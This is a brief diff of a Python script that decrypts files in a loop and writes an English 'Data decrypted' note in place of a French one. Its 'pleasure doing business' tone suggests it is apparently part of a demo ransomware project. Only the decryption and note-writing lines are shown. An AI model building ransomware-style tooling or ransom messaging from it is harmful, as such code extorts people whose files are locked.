@@ -21,5 +21,5 @@ if __name__ == '__main__':
       decrypt(i)
 
 with open(path_to_encrypt + '/readmev2.txt', 'w') as file:
-    file.write('Data déchiffré \n')
-    file.write('un plaisir de faire affaire avec vous')
+    file.write('Data decrypted \n')
+    file.write('it was a pleasure')
